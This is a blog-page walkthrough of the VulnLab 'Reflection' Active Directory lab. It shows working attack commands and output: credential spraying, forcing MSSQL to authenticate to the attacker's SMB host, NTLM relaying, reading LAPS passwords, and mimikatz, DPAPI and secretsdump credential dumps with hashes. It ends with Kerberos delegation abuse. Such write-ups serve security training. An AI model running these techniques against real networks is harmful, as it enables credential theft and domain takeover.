@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Reflection AD Chain VulnLab - Writeup | Mohamed Khalil Mzali</title><meta name="author" content="Mohamed Khalil Mzali"><meta name="copyright" content="Mohamed Khalil Mzali"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Reflection is an AD chain composed of 3 machines MS01, WS01 and DC01. It involves NTLM Relaying, exploiting LAPS and Resource-Based Constrained Delegation.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Reflection AD Chain VulnLab - Writeup">
+<meta property="og:url" content="https://cyberkmz.github.io/2024/11/28/ReflectionChainWriteup/index.html">
+<meta property="og:site_name" content="Mohamed Khalil Mzali">
+<meta property="og:description" content="Reflection is an AD chain composed of 3 machines MS01, WS01 and DC01. It involves NTLM Relaying, exploiting LAPS and Resource-Based Constrained Delegation.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cyberkmz.github.io/img/Reflection/reflection.png">
+<meta property="article:published_time" content="2024-11-27T23:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T19:20:32.191Z">
+<meta property="article:author" content="Mohamed Khalil Mzali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cyberkmz.github.io/img/Reflection/reflection.png"><link rel="shortcut icon" href="/img/shield-halved-solid.svg"><link rel="canonical" href="https://cyberkmz.github.io/2024/11/28/ReflectionChainWriteup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Reflection AD Chain VulnLab - Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-29 20:20:32'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/CyberKMZ.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/Reflection/reflection.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Mohamed Khalil Mzali"><span class="site-name">Mohamed Khalil Mzali</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Reflection AD Chain VulnLab - Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-27T23:00:00.000Z" title="Created 2024-11-28 00:00:00">2024-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-29T19:20:32.191Z" title="Updated 2024-11-29 20:20:32">2024-11-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnLab/">VulnLab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Reflection AD Chain VulnLab - Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Reflection is an AD chain composed of 3 machines MS01, WS01 and DC01. It involves NTLM Relaying, exploiting LAPS and Resource-Based Constrained Delegation.</p>
+<p><strong>Scan for DC01</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-29 17:42:03Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">64140/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">64155/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p><strong>Scan for MS01</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>Scan for WS01</strong><br> &#96;&#96;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5040/tcp open  unknown</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+
+<p>Started by getting access to the <strong>staging_db.conf</strong> file inside the <code>stagingarea</code> share on <strong>MS01</strong>, with the following credentials</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241101193834.png"></p>
+<h2 id="MSSQL-enumeration"><a href="#MSSQL-enumeration" class="headerlink" title="MSSQL enumeration"></a>MSSQL enumeration</h2><p>Using <strong>crackmapexec</strong> we spray the credentials for the MSSQL service, as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec mssql 10.10.159.85-87 -u <span class="string">&#x27;web_staging&#x27;</span> -p <span class="string">&#x27;Washroom510&#x27;</span> --local-auth </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241127113022.png"></p>
+<p>Having access to <code>MS01</code> as the <code>web_staging</code> user, we authenticate to the MSSQL server with his credentials</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient <span class="string">&#x27;web_staging&#x27;</span>:<span class="string">&#x27;Washroom510&#x27;</span>@10.10.139.6</span><br></pre></td></tr></table></figure>
+
+<p>Enumerating the MSSQL server as our current user, we can see that we are running as guest, and got the version of the server running</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241103194518.png"></p>
+<p>We also stumbled upon the database “staging” and displayed the users table credentials</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241103195023.png"></p>
+<p>Running <code>xp_cmdshell</code> is not allowed for our current user</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241103195741.png"></p>
+<p>So, in this case we will be relying on the <code>NTLM Stealing</code> technique which consists on establishing a connection from the MSSQL server to authenticate to a self-hosted smb server in order to capture the current user’s hash</p>
+<p>To do it, we need to:</p>
+<ol>
+<li><code>xp_dirtree &#39;\\10.8.4.76\share&#39; </code> specifying our IP and name of the share</li>
+<li>Run responder or smbserver.py from impacket and wait for the connection to be established giving the following output</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.200.166</span><br><span class="line">[SMB] NTLMv2-SSP Username : REFLECTION\svc_web_staging</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:34de597976641b30:3D886C0C1FE53C29C1BFD8B35B898865:010100000000000000AAA0D4F82DDB01E1783CE2367A266A0000000002000800440055005400310001001E00570049004E002D005200540056004D00440050003300510047004900340004003400570049004E002D005200540056004D0044005000330051004700490034002E0044005500540031002E004C004F00430041004C000300140044005500540031002E004C004F00430041004C000500140044005500540031002E004C004F00430041004C000700080000AAA0D4F82DDB010600040002000000080030003000000000000000000000000030000085428B22D3204F1485F8259B119B0BFE483B5A72F0816737E120CBB0A54D079D0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0034002E00370036000000000000000000  </span><br><span class="line"></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">## NTLM Relaying</span><br><span class="line"></span><br><span class="line">Trying to crack the hash with hashcat takes a long time. Another way to use these credentials is to relay them.</span><br><span class="line"></span><br><span class="line">1) We setup the ntlm relay targeting **DC01**  </span><br><span class="line">```bash</span><br><span class="line">ntlmrelayx.py -tf targets.txt -smb2support -socks</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>We use <code>xp_dirtree</code> on the mssql server to authenticate to the smb server hosted on our local machine</p>
+</li>
+<li><p>We uncomment the socks4 line on the <strong>&#x2F;etc&#x2F;proxychains4.conf</strong> file</p>
+</li>
+</ol>
+<p><img src="/img/Reflection/Pasted%20image%2020241127115556.png"><br>Then relying on the socks proxy we setup, we relayed the credentials to the smb server on the DC machine: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient -L \\\\10.10.139.5 -U <span class="string">&quot;Reflection/svc_web_staging&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241127120316.png"></p>
+<p>We decide to list for the uncommon prod share that revealed additional credentials for a database</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //10.10.139.5/prod -U <span class="string">&quot;Reflection/svc_web_staging&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241127120855.png"></p>
+<p>We use these credentials to authenticate to the other MSSQL database on DC01</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py <span class="string">&#x27;web_prod&#x27;</span>:<span class="string">&#x27;Tribesman201&#x27;</span>@10.10.139.5</span><br></pre></td></tr></table></figure>
+
+<p>Having access to the MSSQL instance, we started by listing the available databases and found a <strong>prod</strong> database</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241127133305.png"></p>
+<p>Listing the <code>users</code> table inside that database gave us access to 2 credentials</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241127133412.png"></p>
+<p>The first credential for <code>abbie.smith</code> is valid while the other one is invalid<br><img src="/img/Reflection/Pasted%20image%2020241127133502.png"></p>
+<h2 id="Domain-enumeration"><a href="#Domain-enumeration" class="headerlink" title="Domain enumeration"></a>Domain enumeration</h2><p>Having valid domain credentials, the next step is to enumerate the domain <strong>reflection.vl</strong>, as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u <span class="string">&quot;abbie.smith&quot;</span> -p <span class="string">&quot;CMe1x+nlRaaWEw&quot;</span> -d reflection.vl -c all -v -ns 10.10.139.5 --zip</span><br></pre></td></tr></table></figure>
+
+<p>As we can see, <strong>Abbie.smith</strong> has Generic All on the MS01 machine, which allows to perform RBCD<br><img src="/img/Reflection/Pasted%20image%2020241127134523.png"></p>
+<h2 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;Password_123&#x27; -dc-ip 10.10.139.5 &#x27;reflection.vl&#x27;/&#x27;abbie.smith&#x27;:&#x27;CMe1x+nlRaaWEw&#x27; -dc-host &#x27;DC01.reflection.vl&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>When trying to add a new computer to the domain, we get an <code> machine account quota exceeded</code> error message.</p>
+<p>We can check the <code>MachineAccountQuota</code> by doing: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.139.5 -u abbie.smith -p <span class="string">&quot;CMe1x+nlRaaWEw&quot;</span> --kdcHost 10.10.139.5 -M maq</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241127145328.png"></p>
+<p>However, when we return to our bloodhound enumeration, MS01 has LAPS enabled used for storing the local administrator’s account password of the machine and only accessible to users who have been granted permission through ACLs.</p>
+<p>This will allow us as <code>abbie.smith</code> to list the LAPS password as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.139.5 -u abbie.smith -p <span class="string">&quot;CMe1x+nlRaaWEw&quot;</span> --kdcHost 10.10.139.5 -M laps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241127145652.png"></p>
+<h2 id="MS01"><a href="#MS01" class="headerlink" title="MS01"></a>MS01</h2><p>Having the password of the MS01 administrator account, we can get the initial foothold into that machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm  -u <span class="string">&quot;MS01\administrator&quot;</span> -p <span class="string">&quot;H447.++h6g5&#125;xi&quot;</span> -i 10.10.139.6</span><br></pre></td></tr></table></figure>
+
+<p>We can get the flag.txt on the Administrator’s folder.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py <span class="string">&quot;MS01/administrator&quot;</span>:<span class="string">&quot;H447.++h6g5&#125;xi&quot;</span>@10.10.139.6 -target-ip 10.10.139.6</span><br></pre></td></tr></table></figure>
+
+<p>Then using mimikatz, we dump the NTLM hash of MS01$ computer account</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241128135304.png"><br><code>MS01$:59772949b28167c1396bd060c40cb531</code></p>
+<p>Doing <code>vault::list</code> with mimikatz also revealed that <code>REFLECTION\Georgia.Price </code> was stored within a Windows vault<br><img src="/img/Reflection/Pasted%20image%2020241127155207.png"></p>
+<p>So using nxc, we can dump the DPAPI secrets</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.166.198 -u <span class="string">&quot;administrator&quot;</span> -p <span class="string">&quot;H447.++h6g5&#125;xi&quot;</span> --local-auth --dpapi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241128124449.png"></p>
+<p>Having owned <code>Georgia.Price </code>, we can see that this user has <code>Generic All</code> on <strong>WS01</strong> which allows to perform RBCD, knowing that we also owned <strong>MS01</strong></p>
+<h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><p>We start by setting up the delegation so that <code>MS01$</code> can delegate to <code>WS01$</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from <span class="string">&#x27;MS01$&#x27;</span> -delegate-to <span class="string">&#x27;WS01$&#x27;</span> -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;reflection.vl/Georgia.Price:DBl+5MPkpJg5id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Reflection/Pasted%20image%2020241128130906.png"></p>
+<p>Now that we delegated access to <code>WS01$</code>, we can impersonate the administrator for CIFS service by requesting a service ticket for it :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn <span class="string">&#x27;cifs/WS01.reflection.vl&#x27;</span> -impersonate <span class="string">&#x27;Administrator&#x27;</span> -hashes <span class="string">&#x27;:59772949b28167c1396bd060c40cb531&#x27;</span> <span class="string">&#x27;reflection.vl/MS01$&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>We reference the service ticket ccache file to <code>KRB5CCNAME</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=<span class="variable">$PWD</span>/Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache</span><br></pre></td></tr></table></figure>
+
+<p>We can then dump secrets using the <code>WS01\Administrator</code> ccache file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py administrator@WS01.reflection.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is in stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x7ed33ac4a19a5ea7635d402e58c0055f</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:236728438532f0f1a57360173bda0575:::</span><br><span class="line">labadm:1001:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763240eaa4c0e3d</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:60f93183d65f38d1de7a4c25fa3caad6a636c4b25621df952bdaa9a6748d02507850c8418a57cbaaf69ada93d7fccf6622c7045af9f6b8bd58d260418198ad6b138bda0617d50aecbe5e8bb14495ab5664db4c2c2979e6bae81cbf4fe0c4e9529ef5e56cf022e71fb22f500f7854f6e3e623c3554f9e56875a6db7e34c8eda7e016443e0db1aee11fc08652707d7861d0dd5153d6c6c8482094b4db82588f53a74bce99903fe5b9b4ba4d1b1b814edb4b39bb3be2e31bdaad786cc709f18d558da6e0389bf989ce59e98209ec1a56b85254cd4a2c66b9518ee8d9eed00e7251232f0e9668eeb98fba14b83edf4cd950f</span><br><span class="line">REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:eceb090f6618bc7094f17eefbb07c0d0:::</span><br><span class="line">[*] DefaultPassword </span><br><span class="line">reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0xe7b434bbb2fe36946ecafdfab07d4396c039c6e8</span><br><span class="line">dpapi_userkey:0xf772db3cfa86d2d96caf0fc57946c6e7c17511eb</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   DE AA F4 50 81 29 7C 82  0D 6F F2 2D 08 8B A2 7A   ...P.)|..o.-...z</span><br><span class="line"> 0010   7D 46 9F 66 C3 8F D4 9A  FA DB D2 9D 56 9A 79 28   &#125;F.f........V.y(</span><br><span class="line"> 0020   10 1F 8F 40 B4 EB 04 6F  42 8F 37 02 7E E5 85 93   ...@...oB.7.~...</span><br><span class="line"> 0030   00 9C 28 46 DE 39 3F BB  78 90 E7 C8 AB 3A 75 D1   ..(F.9?.x....:u.</span><br><span class="line">NL$KM:deaaf45081297c820d6ff22d088ba27a7d469f66c38fd49afadbd29d569a7928101f8f40b4eb046f428f37027ee58593009c2846de393fbb7890e7c8ab3a75d1</span><br></pre></td></tr></table></figure>
+
+<p>We found in the output the password of another domain user <code>reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP</code> which could help us afterwards.</p>
+<h2 id="WS01"><a href="#WS01" class="headerlink" title="WS01"></a>WS01</h2><p>But before, we get our foothold into the <strong>WS01</strong> machine</p>
